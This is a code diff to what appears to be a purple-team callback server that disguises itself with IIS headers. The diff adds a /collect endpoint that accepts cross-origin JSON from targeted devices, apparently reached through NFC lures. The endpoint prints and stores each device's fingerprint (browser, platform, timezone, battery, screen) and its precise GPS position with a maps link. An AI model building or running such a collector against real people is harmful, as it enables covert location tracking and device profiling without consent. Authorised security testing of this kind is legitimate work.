@@ -250,6 +250,11 @@ class _Handler(http.server.BaseHTTPRequestHandler):
         length = int(self.headers.get("Content-Length", 0))
         body_raw = self.rfile.read(length) if length else b""
 
+        # NFC recon data collection (Phase A passive + Phase B GPS)
+        if raw_path == "/collect":
+            self._handle_nfc_collect(body_raw)
+            return
+
         # Purple team web UI (POST — label endpoint)
         if raw_path.startswith("/ui"):
             db = _ENGAGE_DB
@@ -410,6 +415,75 @@ class _Handler(http.server.BaseHTTPRequestHandler):
             _ENGAGE_DB.log_event("callback",
                                  f"token={token} src={self.client_address[0]}",
                                  extra={"output_preview": output[:500]})
+
+    def _handle_nfc_collect(self, body: bytes):
+        resp = b'{"ok":1}'
+        self.send_response(200)
+        self._add_iis_headers()
+        self.send_header("Content-Type",                "application/json")
+        self.send_header("Content-Length",              str(len(resp)))
+        self.send_header("Access-Control-Allow-Origin", "*")
+        self.end_headers()
+        self.wfile.write(resp)
+
+        try:
+            data = json.loads(body)
+        except Exception:
+            return
+
+        src   = self.client_address[0]
+        ts    = datetime.now().strftime("%H:%M:%S")
+        phase = data.get("phase", "?")
+        label = "NFC-PASSIVE" if phase == "passive" else "NFC-RECON  "
+
+        print(f"\n{'─'*62}")
+        print(f"[{ts}] {label}  src={src}  phase={phase}")
+        print(f"{'─'*62}")
+
+        _fields = [
+            ("ua",       "User-Agent"),
+            ("platform", "Platform  "),
+            ("lang",     "Language  "),
+            ("tz",       "Timezone  "),
+            ("net_type", "Network   "),
+            ("cores",    "CPU cores "),
+            ("mem",      "Memory    "),
+            ("touch",    "Touch pts "),
+            ("bat",      "Battery   "),
+            ("lat",      "GPS Lat   "),
+            ("lon",      "GPS Lon   "),
+            ("acc",      "GPS Acc   "),
+            ("alt",      "GPS Alt   "),
+        ]
+        for key, lbl in _fields:
+            val = data.get(key)
+            if val is None:
+                continue
+            if key == "bat":
+                val = f"{val}%  charging={data.get('bat_chg')}"
+            elif key in ("lat", "lon"):
+                val = f"{float(val):.6f}"
+            elif key == "acc":
+                val = f"{float(val):.1f} m"
+            elif key == "mem":
+                val = f"{val} GB"
+            print(f"  {lbl} : {val}")
+
+        sw, sh = data.get("sw"), data.get("sh")
+        if sw and sh:
+            print(f"  Screen    : {sw}x{sh}  dpr={data.get('dpr',1)}")
+
+        lat, lon = data.get("lat"), data.get("lon")
+        if lat is not None and lon is not None:
+            print(f"  Maps      : https://maps.google.com/?q={lat},{lon}")
+
+        print(f"{'─'*62}\n")
+
+        if _ENGAGE_DB:
+            ua  = (data.get("ua") or "")[:80]
+            loc = f"  gps={lat:.5f},{lon:.5f}" if lat is not None else ""
+            summary = f"src={src}  phase={phase}  ua={ua}{loc}"
+            _ENGAGE_DB.log_event("nfc_recon", summary, extra=data)
 
     # ── helpers ───────────────────────────────────────────────────────────────
 
